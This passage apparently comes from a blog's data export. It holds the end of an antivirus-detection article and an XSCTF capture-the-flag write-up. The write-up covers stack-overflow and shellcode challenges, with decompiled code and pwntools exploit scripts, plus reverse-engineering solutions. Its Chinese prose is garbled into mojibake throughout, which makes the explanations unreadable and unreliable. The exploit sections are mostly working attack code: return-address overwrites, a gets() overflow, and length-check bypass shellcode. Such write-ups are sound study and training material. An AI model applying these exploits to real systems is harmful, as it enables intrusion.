Hookï¼‰ç›‘æ§CreateFileã€WriteFileç­‰æ–‡ä»¶æ“ä½œAPIã€‚å½“æŸè¿›ç¨‹è¿ç»­è°ƒç”¨CreateFileæ‰“å¼€100ä¸ªæ–‡æ¡£æ–‡ä»¶ï¼Œç«‹å³è§¦å‘é¢„è­¦ã€‚ è¡Œä¸ºå…³è”åˆ†æç»“åˆä¸Šä¸‹æ–‡åˆ¤æ–­æ“ä½œé£é™©ï¼šè‹¥è¯¥è¿›ç¨‹åŒæ—¶è°ƒç”¨CryptGenKeyç”ŸæˆåŠ å¯†å¯†é’¥ï¼Œå¹¶åˆ é™¤å·å½±å‰¯æœ¬ï¼ˆé€šè¿‡vssadmin.exeï¼‰ï¼Œåˆ™åˆ¤å®šä¸ºå‹’ç´¢ç—…æ¯’ï¼Œè§¦å‘å®æ—¶æ‹¦æˆªã€‚ æ²™ç®±éªŒè¯æœºåˆ¶å¯¹å¯ç–‘è¿›ç¨‹è¿›è¡Œéš”ç¦»è¿è¡Œï¼ˆå¦‚Cuckooæ²™ç®±ï¼‰ï¼Œè§‚å¯Ÿå…¶æ˜¯å¦é‡Šæ”¾åŠ å¯†å‹’ç´¢ä¿¡ï¼ˆå¦‚README.txtï¼‰ï¼Œæœ€ç»ˆç¡®è®¤æ¶æ„è¡Œä¸ºã€‚ å¯å‘å¼åˆ†æï¼šæœªçŸ¥å¨èƒçš„â€œé€»è¾‘æ•æ‰‹â€å¯å‘å¼åˆ†æçš„æ ¸å¿ƒæœºåˆ¶å¯å‘å¼åˆ†æé€šè¿‡é¢„å®šä¹‰è§„åˆ™é›†å¯¹ç¨‹åºè¿›è¡Œé£é™©è¯„åˆ†ï¼Œä¸»è¦æ£€æµ‹ä»¥ä¸‹å¯ç–‘æ¨¡å¼ï¼š ä»£ç ç»“æ„å¼‚å¸¸ PEå¤´ä¿¡æ¯ç¯¡æ”¹ï¼ˆå¦‚å…¥å£ç‚¹æŒ‡å‘èµ„æºèŠ‚ï¼‰ï¼› èŠ‚åŒºæ®µç†µå€¼è¿‡é«˜ï¼ˆå¯èƒ½ç»è¿‡åŠ å¯†æˆ–å‹ç¼©ï¼‰ï¼› å¯¼å…¥è¡¨å¼‚å¸¸ï¼ˆå¦‚ä»…ä¾èµ–LoadLibraryå’ŒGetProcAddressåŠ¨æ€åŠ è½½APIï¼‰ã€‚ è¡Œä¸ºæ¨¡å¼è¯„åˆ†æ„å»ºè¯„åˆ†ç³»ç»Ÿï¼ˆæ»¡åˆ†100åˆ†ï¼‰ï¼Œä¾‹å¦‚ï¼š åˆ›å»ºè‡ªå¯åŠ¨é¡¹ï¼š+20åˆ†ï¼› å°è¯•å…³é—­æ€æ¯’è½¯ä»¶è¿›ç¨‹ï¼š+30åˆ†ï¼› æ— æ•°å­—ç­¾åä¸”è¯„åˆ†è¶…è¿‡70åˆ†ï¼šåˆ¤å®šä¸ºæ¶æ„ç¨‹åºã€‚ æœºå™¨å­¦ä¹ æ¨¡å‹ä½¿ç”¨éšæœºæ£®æ—æˆ–ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œè¾“å…¥ç‰¹å¾åŒ…æ‹¬ï¼š APIè°ƒç”¨åºåˆ—ï¼ˆå¦‚VirtualAllocâ†’WriteProcessMemoryâ†’CreateRemoteThreadçš„å…¸å‹æ³¨å…¥åºåˆ—ï¼‰ï¼› å­—ç¬¦ä¸²ç‰¹å¾ï¼ˆå¦‚ç¡¬ç¼–ç IPåœ°å€æˆ–åŸŸåï¼‰ï¼› ä»£ç ç›¸ä¼¼åº¦ï¼ˆä¸å·²çŸ¥ç—…æ¯’å®¶æ—çš„ä»£ç å—åŒ¹é…åº¦ï¼‰ã€‚ ç—…æ¯’åº“çš„é«˜æ•ˆæ„å»ºä¸åŒ¹é…æœºåˆ¶ç—…æ¯’åº“çš„å·¥ç¨‹åŒ–è®¾è®¡ç›´æ¥å½±å“æ‰«ææ€§èƒ½ã€‚å…¸å‹æ–¹æ¡ˆåŒ…æ‹¬ï¼š åˆ†åº“å­˜å‚¨ï¼šæŒ‰ç‰¹å¾ç å“ˆå¸Œé¦–å­—æ¯åˆ’åˆ†16ä¸ªå­åº“ï¼Œå‡å°‘éå†æ¬¡æ•°ï¼› å¢é‡æ›´æ–°ï¼šä»…åŒæ­¥æ–°å¢ç‰¹å¾ç ï¼Œé¿å…å…¨é‡ä¸‹è½½å ç”¨èµ„æºï¼› å¹¶è¡Œå¤„ç†ï¼šå¤šçº¿ç¨‹åŒæ—¶æ‰«ææ–‡ä»¶çš„ä¸åŒåŒºæ®µï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸CPUæ€§èƒ½ã€‚ æŠ€æœ¯æ¼”è¿›ä¸æœªæ¥é˜²å¾¡è¶‹åŠ¿å½“å‰ç—…æ¯’é˜²å¾¡é¢ä¸´ä¸¤å¤§æŒ‘æˆ˜ï¼š æœªçŸ¥ç—…æ¯’æ£€æµ‹ï¼šä¼ ç»Ÿç‰¹å¾ç ä»…èƒ½åº”å¯¹å·²çŸ¥å¨èƒï¼› é›¶æ—¥æ”»å‡»é˜²å¾¡ï¼šAPTæ”»å‡»å¸¸åˆ©ç”¨æœªå…¬å¼€æ¼æ´ï¼Œç»•è¿‡å¸¸è§„æ£€æµ‹ã€‚ æœªæ¥æŠ€æœ¯å°†å‘ä»¥ä¸‹æ–¹å‘å‘å±•ï¼š AIä¸æœºå™¨å­¦ä¹ ï¼šé€šè¿‡è®­ç»ƒæ¨¡å‹è¯†åˆ«æ¶æ„ä»£ç æ¨¡å¼ï¼Œä¾‹å¦‚åˆ†æAPIè°ƒç”¨åºåˆ—æˆ–å†…å­˜è¡Œä¸ºå¼‚å¸¸ï¼› äº‘å®‰å…¨ååŒï¼šå®æ—¶å…±äº«å…¨çƒç—…æ¯’ç‰¹å¾æ•°æ®ï¼Œæ„å»ºåˆ†å¸ƒå¼å¨èƒæƒ…æŠ¥ç½‘ç»œï¼› ä¸»åŠ¨é˜²å¾¡ç³»ç»Ÿï¼šåŸºäºç¨‹åºè¡Œä¸ºå®æ—¶æ‹¦æˆªå¯ç–‘æ“ä½œï¼Œè€Œéä¾èµ–äº‹åç‰¹å¾åŒ¹é…ã€‚ ç”¨æˆ·é˜²æŠ¤å»ºè®® é€‰æ‹©æ€æ¯’è½¯ä»¶ï¼šä¼˜å…ˆè€ƒè™‘ç—…æ¯’åº“æ›´æ–°é¢‘ç‡å¿«ã€èµ„æºå ç”¨ä½çš„å·¥å…·ï¼› ç³»ç»Ÿç»´æŠ¤ï¼šå®šæœŸå®‰è£…å®‰å…¨è¡¥ä¸ï¼Œé¿å…æ¼æ´è¢«åˆ©ç”¨ï¼› å®‰å…¨æ„è¯†ï¼šè°¨æ…æ‰«æä¸æ˜æ¥æºçš„äºŒç»´ç æˆ–é“¾æ¥ï¼Œé˜²æ­¢é’“é±¼æ”»å‡»ã€‚ ç»“è¯­ç—…æ¯’é˜²å¾¡æ˜¯æŠ€æœ¯ä¸æ„è¯†çš„åŒé‡åšå¼ˆã€‚å°½ç®¡ç‰¹å¾ç æŠ€æœ¯ä»æ˜¯å½“å‰ä¸»æµï¼Œä½†å…¶å±€é™æ€§å‚¬ç”Ÿäº†è¡Œä¸ºåˆ†æã€AIé¢„æµ‹ç­‰æ–°ä¸€ä»£è§£å†³æ–¹æ¡ˆã€‚ç”¨æˆ·éœ€åœ¨ä¾èµ–æŠ€æœ¯é˜²æŠ¤çš„åŒæ—¶ï¼Œä¿æŒè­¦æƒ•ï¼Œæ–¹èƒ½æ„ç­‘å…¨é¢çš„æ•°å­—å®‰å…¨é˜²çº¿ã€‚","categories":[],"tags":[{"name":"CyberSecurity","slug":"CyberSecurity","permalink":"http://uniqueland.top/tags/CyberSecurity/"}]},{"title":"XSCTF_fresh","slug":"xsctf_fresh","date":"2024-11-09T19:03:42.512Z","updated":"2024-11-09T19:29:29.091Z","comments":true,"path":"2024/11/10/xsctf_fresh/","link":"","permalink":"http://uniqueland.top/2024/11/10/xsctf_fresh/","excerpt":"","text":"c_masterè¯·ä½¿ç”¨ç®€å•çš„Cè¯­å¥å¯¹ç¨‹åºè¿›è¡Œgetshellå§ï¼ 123456Try to write a C getshell program with my code!read(0,base,0x8);write(1,base,0x8);base+&#x3D;8;base-&#x3D;8;return 0; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-1Ch] void *s; // [rsp+8h] [rbp-18h] char v6[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); init(argc, argv, envp); v4 = 0; s = malloc(0x400uLL); memset(s, 0, 1024uLL); puts(&quot;Try to write a C getshell program with my code!&quot;); puts(&quot;read(0,base,0x8);&quot;); puts(&quot;write(1,base,0x8);&quot;); puts(&quot;base+=8;&quot;); puts(&quot;base-=8;&quot;); puts(&quot;return 0;&quot;); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;&gt;&gt;&gt;&quot;); __isoc99_scanf(&quot;%128s&quot;, s); if ( strcmp((const char *)s, &quot;read(0,base,0x8);&quot;) ) break; puts(&quot;input:&quot;); read(0, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;write(1,base,0x8);&quot;) ) break; puts(&quot;output:&quot;); write(1, &amp;v6[v4], 8uLL); &#125; if ( strcmp((const char *)s, &quot;base+=8;&quot;) ) break; v4 += 8; &#125; if ( strcmp((const char *)s, &quot;base-=8;&quot;) ) break; v4 -= 8; &#125; if ( strcmp((const char *)s, &quot;return 0;&quot;) ) break; puts(&quot;No such code...&quot;); &#125; return 0;&#125; æ ¹æ®è¾“å…¥ç¡®å®šå†™å…¥æ•°æ®çš„åœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥å°†ä½ç½®å®šä½åˆ°mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå†™å…¥ç¨‹åºä¸­æä¾›çš„backdoorå‡½æ•°éœ€è¦æ³¨æ„ç¨‹åºå¼€äº†canaryï¼Œæ‰€ä»¥è¦å¤šå¾€åèµ°ä¸€æ¬¡ Low Address â€¦ local var &lt;- rsp canary value &lt;- rbp-8 old rbp &lt;- rbp return address args High Address â€¦ å‘ï¼šç›´æ¥è¿”å›åˆ°backdoorå‡½æ•°åˆä¸å¯ä»¥ï¼Œéœ€è¦è¿”å›åˆ°å®é™…æ‰§è¡Œsystemå‡½æ•°çš„ä»£ç åœ°å€ exp 123456789101112131415161718from pwn import *p = remote(&quot;43.248.97.213&quot;, 30483)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;base+=8;&quot;)p.recv()p.sendline(b&quot;read(0,base,0x8);&quot;)p.recv()p.sendline(p64(0x4012c3))p.recv()p.sendline(b&quot;return 0;&quot;)p.interactive() XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125; rock_paper_scissorsæ¬¢è¿æ¥åˆ°çŸ³å¤´å‰ªåˆ€å¸ƒï¼ä¸€å…±è¿›è¡Œä¸‰åå±€ï¼Œä½ èµ¢äº†åŠ ä¸€åˆ†ï¼Œè¾“äº†æˆ–å¹³å±€ä¸å¾—åˆ†è·å¾—ååˆ†å°±ç®—èƒœåˆ©ï¼è¾“å…¥â€™çŸ³å¤´â€™ã€â€™å‰ªåˆ€â€™æˆ–â€™å¸ƒâ€™æ¥è¿›è¡Œæ¸¸æˆ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax char v5[28]; // [rsp+0h] [rbp-30h] BYREF int v6; // [rsp+1Ch] [rbp-14h] unsigned int RandomMove; // [rsp+20h] [rbp-10h] unsigned int userout; // [rsp+24h] [rbp-Ch] int v9; // [rsp+28h] [rbp-8h] signed int v10; // [rsp+2Ch] [rbp-4h] v10 = 0; v9 = 0; v3 = time(0LL); srand(v3); puts(&amp;byte_402080); puts(&amp;byte_4020A0); puts(&amp;byte_4020E6); puts(&amp;byte_402108); while ( v10 &lt;= 9 &amp;&amp; v9 &lt;= 29 ) &#123; printf(&amp;byte_402139); fflush(stdout); if ( v10 &gt; 5 ) gets(v5); __isoc99_scanf(&amp;unk_402151, v5); userout = stringToMove(v5); if ( userout == -1 ) &#123; puts(&amp;byte_402158); &#125; else if ( v10 &gt; 8 || v10 &lt;= 5 || (int)hard() &lt;= 2 ) &#123; if ( v10 == 9 &amp;&amp; (unsigned int)hell() != 666 ) &#123;LABEL_10: win(userout, v10); &#125; else &#123; RandomMove = getRandomMove(); printf(&amp;format); if ( RandomMove == 2 ) &#123; puts(&amp;byte_402037); &#125; else if ( RandomMove &lt;= 2 ) &#123; if ( RandomMove ) puts(&amp;byte_40203E); else puts(&amp;s2); &#125; v6 = determineWinner(userout, RandomMove); if ( v6 == 1 ) &#123; puts(&amp;byte_4021A7); ++v10; &#125; else if ( v6 == -1 ) &#123; puts(&amp;byte_402054); &#125; else &#123; puts(&amp;byte_402073); &#125; printf(&amp;byte_402061, (unsigned int)v10); ++v9; &#125; &#125; else &#123; if ( (int)hard() &lt;= 4 ) goto LABEL_10; bewin(userout, v10); &#125; &#125; final(); return 0;&#125; å…¶ä¸­finalå‡½æ•°å°±æ˜¯æœ€ç»ˆçš„shellï¼Œè€Œgetså‡½æ•°å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨æ ˆæº¢å‡ºå°†å½“å‰å‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºfinalå‡½æ•°çš„è¿”å›åœ°å€ä½†æ˜¯ä¼ è¾“çš„payloadéœ€è¦ç¬¦åˆä¸€å®šæ¡ä»¶å› ä¸ºç¨‹åºå¯¹è¾“å…¥è¿›è¡Œäº†æ£€æŸ¥ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»æ˜¯çŸ³å¤´å‰ªåˆ€å¸ƒçš„ä¸€ç§è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç”¨%00ä½œä¸ºpayloadï¼Œå³è¾“å…¥çŸ³å¤´çš„ç¼–ç ååŠ ä¸Š%00ï¼Œè¿™æ ·ç¨‹åºåœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶é‡åˆ°%00å°±ä¼šè®¤ä¸ºå·²ç»åˆ°å­—ç¬¦ä¸²æœ«å°¾äº†ï¼Œè€Œå®é™…çš„payloadä¼šå…¨éƒ¨ä¼ è¾“åˆ°å†…å­˜ä¸­ ä¸­æ–‡åœ¨Cè¯­è¨€ä¸­ä½¿ç”¨utf-8ç¼–ç ï¼Œä¸€ä¸ªä¸­æ–‡å­—ç¬¦å ç”¨ä¸‰ä¸ªå­—èŠ‚åœ¨æ„é€ payloadæ—¶è¦æ³¨æ„ç«¯åºï¼Œä¾‹å¦‚â€œçŸ³å¤´â€çš„utf-8ç¼–ç æ˜¯E79FB3E5A4B4ä½†æ˜¯å®é™…ä¼ è¾“æ—¶æ˜¯p64(0xe5b39fe7)+p64(0xb4a4) exp 123456789from pwn import *# p = process(&#x27;./rock_paper_scissors&#x27;)p = remote(&#x27;43.248.97.213&#x27;, 30480)# print(list(p64(0xe5b39fe7)+p64(0xb4a4)))p.recv()p.sendline(p64(0xe5b39fe7)+p64(0xb4a4)+b&#x27;a&#x27;*20+b&#x27;b&#x27;*8+p64(0x4012db))p.interactive() XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125; toolongä¸€ä¸ªå­—èŠ‚èƒ½è§£å†³çš„shellcodeï¼Œå°±ä¸è¦ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼ ç¨‹åºä¸¤æ¬¡æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå…¶ä¸­ç¬¬äºŒæ¬¡åº”è¯¥è¾“å…¥shellcodeï¼Œä¹‹åç¨‹åºä¼šå°†ç”¨æˆ·è¾“å…¥çš„shellcodeç›´æ¥æ‰§è¡Œï¼Œä½†æ˜¯é¢˜ç›®é™åˆ¶äº†è¾“å…¥shellcodeçš„é•¿åº¦ï¼ˆ24ï¼‰ é¢˜ç›®ç»™çš„å¯æ‰§è¡Œæ–‡ä»¶åæ±‡ç¼–å¤±è´¥ï¼Œä¼°è®¡æ˜¯å°†å­—ç¬¦ä¸²åœ°å€ä½œä¸ºå‡½æ•°åœ°å€ç›´æ¥è°ƒç”¨å¯¼è‡´çš„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp).text:000055A4CE79820E public main.text:000055A4CE79820E main proc near ; DATA XREF: _start+18â†‘o.text:000055A4CE79820E.text:000055A4CE79820E s&#x3D; byte ptr -150h.text:000055A4CE79820E buf&#x3D; byte ptr -50h.text:000055A4CE79820E var_8&#x3D; dword ptr -8.text:000055A4CE79820E var_4&#x3D; dword ptr -4.text:000055A4CE79820E.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000.text:000055A4CE79820E endbr64.text:000055A4CE798212 push rbp.text:000055A4CE798213 mov rbp, rsp.text:000055A4CE798216 sub rsp, 150h.text:000055A4CE79821D mov eax, 0.text:000055A4CE798222 call init.text:000055A4CE798227 mov [rbp+var_8], 1.text:000055A4CE79822E lea rax, s ; &quot;Welcome to XSCTF&quot;.text:000055A4CE798235 mov rdi, rax ; s.text:000055A4CE798238 call _puts.text:000055A4CE79823D lea rax, [rbp+buf].text:000055A4CE798241 mov edx, 81 ; nbytes.text:000055A4CE798246 mov rsi, rax ; buf.text:000055A4CE798249 mov edi, 0 ; fd.text:000055A4CE79824E call _read.text:000055A4CE798253 lea rax, aInputYourMagic ; &quot;input your magic code:&quot;.text:000055A4CE79825A mov rdi, rax ; s.text:000055A4CE79825D call _puts.text:000055A4CE798262 lea rax, [rbp+s].text:000055A4CE798269 mov edx, 256 ; nbytes.text:000055A4CE79826E mov rsi, rax ; buf.text:000055A4CE798271 mov edi, 0 ; fd.text:000055A4CE798276 call _read.text:000055A4CE79827B mov [rbp+var_4], eax.text:000055A4CE79827E cmp [rbp+var_4], 0.text:000055A4CE798282 jg short loc_55A4CE79828B.text:000055A4CE798284 mov eax, 0.text:000055A4CE798289 jmp short locret_55A4CE7982DE.text:000055A4CE79828B ; ---------------------------------------------------------------------------.text:000055A4CE79828B.text:000055A4CE79828B loc_55A4CE79828B: ; CODE XREF: main+74â†‘j.text:000055A4CE79828B lea rax, [rbp+s].text:000055A4CE798292 mov rdi, rax ; s.text:000055A4CE798295 call _strlen.text:000055A4CE79829A mov edx, [rbp+var_8].text:000055A4CE79829D movsxd rdx, edx.text:000055A4CE7982A0 cmp rax, rdx.text:000055A4CE7982A3 ja short loc_55A4CE7982BA.text:000055A4CE7982A5 lea rax, [rbp+s].text:000055A4CE7982AC mov rdi, rax ; s.text:000055A4CE7982AF call _strlen.text:000055A4CE7982B4 cmp rax, 24.text:000055A4CE7982B8 jbe short loc_55A4CE7982D0.text:000055A4CE7982BA.text:000055A4CE7982BA loc_55A4CE7982BA: ; CODE XREF: main+95â†‘j.text:000055A4CE7982BA lea rax, aTooLong ; &quot;too long!&quot;.text:000055A4CE7982C1 mov rdi, rax ; s.text:000055A4CE7982C4 call _puts.text:000055A4CE7982C9 mov eax, 0.text:000055A4CE7982CE jmp short locret_55A4CE7982DE.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------.text:000055A4CE7982D0.text:000055A4CE7982D0 loc_55A4CE7982D0: ; CODE XREF: main+AAâ†‘j.text:000055A4CE7982D0 lea rax, [rbp+s].text:000055A4CE7982D7 call rax.text:000055A4CE7982D9 mov eax, 0.text:000055A4CE7982DE.text:000055A4CE7982DE locret_55A4CE7982DE: ; CODE XREF: main+7Bâ†‘j.text:000055A4CE7982DE ; main+C0â†‘j.text:000055A4CE7982DE leave.text:000055A4CE7982DF retn.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E.text:000055A4CE7982DF main endp å€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ç¨‹åºæ¥æ”¶äº†ä¸¤æ¬¡ç”¨æˆ·è¾“å…¥è€Œåœ¨æ¥æ”¶äº†ä¸¤æ¬¡è¾“å…¥ä¹‹åç¨‹åºä¼šå¯¹è¾“å…¥è¿›è¡Œä¸¤æ¬¡æ£€æŸ¥ åœ¨è°ƒç”¨readå‡½æ•°ä¹‹åï¼Œç¨‹åºä½¿ç”¨strlenå‡½æ•°å°†è¾“å…¥çš„é•¿åº¦å­˜å‚¨åœ¨raxä¸­ï¼Œæ¥ç€ç¨‹åºä¼šå°†raxä¸æ ˆä¸Šçš„ä¸€ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœraxå¤§äºè¯¥å€¼å°±ä¸ä¼šæ‰§è¡Œshellcode ç¬¬äºŒæ¬¡æ˜¯ä¸ä¸€ä¸ªå›ºå®šå€¼ï¼ˆ24ï¼‰æ¯”è¾ƒï¼Œå¦‚æœå¤§äºè¿™ä¸ªå€¼å°±ä¸ä¼šæ‰§è¡Œshellcode å…¶ä¸­ç¬¬ä¸€æ¬¡æ ˆä¸Šçš„å€¼å…¶å®å¯ä»¥é€šè¿‡ç¬¬ä¸€æ¬¡çš„è¾“å…¥ä¿®æ”¹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡è¿™æ¬¡æ¯”è¾ƒè€Œç¬¬äºŒæ¬¡çš„æ¯”è¾ƒéœ€è¦åœ¨å†™å…¥çš„payloadä¸­ä½¿ç”¨%00ä½œä¸ºåˆ†éš”ç¬¦ï¼Œåˆ†å¼€æ­£å¸¸è¾“å…¥å’Œshellcode exp 1234567891011121314from pwn import *#p = process(&#x27;./toolong&#x27;)p = remote(&quot;43.248.97.213&quot;, 30510)p.recv()p.sendline(b&#x27;z&#x27;*80)p.recv()context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode = asm(shellcraft.sh()) + b&#x27;\\x00&#x27;p.sendline(p64(0x1234)+shellcode)p.interactive() XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125; Lets_go_to_xoråªæ˜¯ä¸€ä¸ªè¶…çº§Eazzzzzzzzzzyçš„Goç¨‹åº,Let&#39;s Go! ä½¿ç”¨golangç¼–å†™ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å…¶ä¸»å‡½æ•°åœ¨main.mainä¸­ è¿›å…¥main.mainæ‰¾åˆ°main.decode 1234567891011121314151617181920212223242526__int64 __usercall main_decode@&lt;rax&gt;()&#123; __int64 v0; // rax unsigned __int64 v1; // rbx unsigned __int64 i; // [rsp+12h] [rbp-30h] if ( v1 != qword_C86F18 ) return 0LL; for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) &#123; if ( i &gt;= v1 ) runtime_panicIndex(); if ( (unsigned __int64)((__int64)i % 10) &gt;= 0xA ) runtime_panicIndex(); if ( i &gt;= v1 ) runtime_panicIndex(); *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( i &gt;= v1 ) runtime_panicIndex(); if ( qword_C86F18 &lt;= i ) runtime_panicIndex(); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; return 1LL;&#125; è™½ç„¶å’ŒCè¯­è¨€ä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥å‹‰å¼ºçœ‹å‡ºæ¥é€»è¾‘ï¼Œå¤§æ¦‚å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ„æ€ 12345for ( i = 0LL; (__int64)v1 &gt; (__int64)i; ++i ) *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % 10] ^ *(_BYTE *)(i + v0); if ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) ) return 0LL; &#125; æ‰¾åˆ°main_encå’ŒaIL0veCtfï¼Œæå–æ•°æ®ï¼Œå°†main_encä¸aIL0veCtfå¾ªç¯å¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flag exp 12345key = &#x27;i_l0ve_CtF&#x27;s = [0x0F, 0x33, 0x0D, 0x57, 0x0D, 0x3D, 0x0C, 0x14, 0x38, 0x0E, 0x21, 0x17, 0x33, 0x01, 0x05, 0x3A, 0x0F, 0x34, 0x1A, 0x19, 0x24, 0x6B, 0x1F, 0x64, 0x13, 0x17, 0x22]for i in range(len(s)): print(chr((s[i]^ord(key[i%10]))&amp;0xff), end=&#x27;&#x27;) flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125; loglisteningé¢˜ç›®ä¸‹å‘ä¸€ä¸ªå®‰è£…åŒ…jadxæ‰“å¼€çœ‹åˆ°å¦‚ä¸‹ä»£ç  12345678910111213141516171819202122232425262728293031323334package com.example.loglistening;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import com.example.loglistening.databinding.ActivityMainBinding;public class MainActivity extends AppCompatActivity &#123; private ActivityMainBinding binding; public native void fasheng(); static &#123; System.loadLibrary(&quot;loglistening&quot;); &#125; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater()); this.binding = inflate; setContentView((View) inflate.getRoot()); ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; System.out.println(&quot;å¥½åƒæœ‰ä»€ä¹ˆäº‹æƒ…åœ¨nativeå±‚å‘ç”Ÿäº†!&quot;); MainActivity.this.fasheng(); Toast.makeText(MainActivity.this.getApplicationContext(), &quot;flagå·²ç»ç”Ÿæˆäº†ï¼&quot;, 0).show(); &#125; &#125;); &#125;&#125; æ˜¯é€šè¿‡nativeå±‚çš„ä»£ç ç”Ÿæˆçš„flagæ‰¾åˆ°soæ–‡ä»¶æ‰”è¿›idaï¼Œæ‰¾åˆ°flagçš„ç”Ÿæˆä»£ç  12345678910unsigned __int64 Java_com_example_loglistening_MainActivity_fasheng()&#123; char v1[40]; // [rsp+0h] [rbp-38h] BYREF unsigned __int64 v2; // [rsp+28h] [rbp-10h] v2 = __readfsqword(0x28u); md5(&quot;stardustduststar&quot;, v1); __android_log_print(4LL, &quot;xilo&quot;, &quot;flag&#123;%s&#125;&quot;, v1); return __readfsqword(0x28u);&#125; æŒ‰é“ç†è¯´æŠŠå­—ç¬¦ä¸²md5ä¹‹åå°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œä½†æ˜¯å¤±è´¥äº† çœ‹åˆ°logå­—æ ·ï¼Œç›´æ¥æŸ¥æ—¥å¿— æ¨¡æ‹Ÿå™¨å¼€å¯å¼€å‘è€…é€‰é¡¹ adb devicesç¡®è®¤è¿æ¥æˆåŠŸ è¾“å…¥adb logcat -v time&gt;D:log.txtå¼€å§‹æŠ“å–æ—¥å¿—ï¼ŒæœŸé—´æ‰“å¼€è½¯ä»¶ç‚¹å‡»æŒ‰é’®ç”Ÿæˆflag ç„¶åè¿”å›å‘½ä»¤è¡ŒCtrl+Cå®ŒæˆæŠ“å– æ‰¾åˆ°log.txtæŸ¥çœ‹æ—¥å¿—ï¼ˆè™½ç„¶å‘½ä»¤å†™çš„åœ¨Dç›˜ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯åœ¨å½“å‰ç›®å½•ï¼‰ flag&#123;4724110e8c8a83c123d6df82efee8c53&#125; picchangeè¾“å…¥æ•°å­—å³å¯å¾—åˆ°flagå“¦ ä¸€å¼€å§‹æƒ³çš„æ˜¯ç›´æ¥æ‰”è¿›idaåç¼–è¯‘ç„¶åçœ‹å¯¹å›¾åƒçš„åŠ å¯†é€»è¾‘ï¼Œä¹Ÿå°±æ˜¯ä¸‹é¢çš„ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void __fastcall sub_7FF6B8023C20(const char *a1, __int64 a2)&#123; FILE *Stream; // [rsp+28h] [rbp+8h] FILE *Streama; // [rsp+28h] [rbp+8h] int v4; // [rsp+44h] [rbp+24h] void *Buffer; // [rsp+68h] [rbp+48h] int i; // [rsp+84h] [rbp+64h] sub_7FF6B80213C0(&amp;unk_7FF6B8036017); Stream = fopen(a1, &quot;rb&quot;); if ( Stream ) &#123; fseek(Stream, 0, 2); v4 = ftell(Stream); fseek(Stream, 0, 0); Buffer = malloc(v4); if ( Buffer ) &#123; fread(Buffer, 1ui64, v4, Stream); fclose(Stream); for ( i = 0; i &lt; v4; ++i ) *((_BYTE *)Buffer + i) ^= strtol((const char *)(i % 32 + a2), 0i64, 16); Streama = fopen(&quot;picc_xor.png&quot;, &quot;wb&quot;); if ( Streama ) &#123; fwrite(Buffer, 1ui64, v4, Streama); fclose(Streama); free(Buffer); sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8); &#125; else &#123; perror(&amp;byte_7FF6B802CFA8); free(Buffer); &#125; &#125; else &#123; perror(&amp;byte_7FF6B802CF80); fclose(Stream); &#125; &#125; else &#123; perror(&amp;ErrMsg); &#125;&#125; 